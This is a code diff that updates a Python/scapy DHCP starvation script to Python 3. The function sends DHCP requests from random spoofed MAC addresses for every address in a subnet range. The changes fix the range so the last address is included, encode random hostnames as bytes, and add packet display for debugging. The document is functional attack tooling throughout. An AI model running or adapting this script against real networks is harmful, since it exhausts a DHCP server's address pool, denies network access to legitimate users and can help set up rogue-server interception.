@@ -1,4 +1,4 @@
-#!/usr/bin/env python
+#!/usr/bin/env python3
 # Giuseppe De Marco
 
 # suppress "WARNING: No route found for IPv6 destination :: (no default route?)"
@@ -19,7 +19,7 @@ def starvit(ip_subnet="192.168.1.",
             debug=0):
     # Stops scapy from checking return packet originating from any packet that we have sent out
     conf.checkIPaddr = False    
-    for ip in range(start_ip, end_ip):
+    for ip in range(start_ip, end_ip+1):
         bogus_mac_address = RandMAC()
         requested_ip = ip_subnet + str(ip)
         dhcp_options = [("message-type","request"),
@@ -29,7 +29,9 @@ def starvit(ip_subnet="192.168.1.",
             dhcp_options.insert(1, ("server_id",server_id))
         
         if random_hostnames:
-            dhcp_options.insert(2, ("hostname",random_hostname()))
+            rn = random_hostname()
+            rname = bytes(rn, encoding='ascii')
+            dhcp_options.insert(2, ("hostname", rname))
             
         dhcp_request = Ether(src=bogus_mac_address, dst=dst_mac)\
                            /IP(src="0.0.0.0", dst="255.255.255.255")\
@@ -39,7 +41,7 @@ def starvit(ip_subnet="192.168.1.",
         
         sendp(dhcp_request)
         print("Requesting: " + requested_ip)
-        if debug: print('%r'%dhcp_request)
+        if debug: dhcp_request.show()
         time.sleep(timeout)
 
 
